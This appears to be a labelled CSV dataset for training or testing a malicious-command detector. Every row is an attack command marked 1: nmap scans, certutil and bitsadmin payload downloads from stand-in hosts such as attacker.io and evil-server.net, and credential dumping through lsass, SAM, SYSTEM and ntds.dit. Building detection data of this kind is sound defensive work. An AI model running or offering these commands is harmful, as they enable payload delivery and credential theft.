text,label
nmap -v -sn 192.168.135.84/24,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -p- 192.168.169.125,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.72.254/24,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.108.59,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.185.77,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.252.168,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.155.152,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
"nmap -sS -p 445,139 192.168.117.117",1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -v -sn 192.168.201.213/24,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.90.168,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.52.115,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -p- 192.168.32.10,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.24.178/24,1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -p- 192.168.114.106,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.38.78/24,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.195.94,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
"nmap -sS -p 445,139 192.168.247.255",1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -A -T4 192.168.81.243,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.252.94,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.58.180,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.245.61/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.197.232,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -v -sn 192.168.95.217/24,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.231.181,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.134.213,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.125.162,1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.4.51,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sS -p 3389 192.168.186.52,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.71.245,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -A -T4 192.168.28.214,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.17.73,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.49.251,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.211.191,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.17.238,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -p- 192.168.133.110,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.30.144,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -A -T4 192.168.101.73,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.89.37/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.158.196,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin /create j,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.93.205,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.105.180,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -p- 192.168.68.115,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.96.179,1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -p- 192.168.249.30,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.178.47,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.119.193,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -v -sn 192.168.128.134/24,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -p- 192.168.155.224,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -p- 192.168.51.222,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.82.246,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.71.206,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.62.203,1
certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -p- 192.168.248.113,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -p- 192.168.236.39,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -sS -p 3389 192.168.241.94,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -v -sn 192.168.212.189/24,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.56.200/24,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -p- 192.168.149.132,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sS -p 3389 192.168.100.35,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.152.169,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
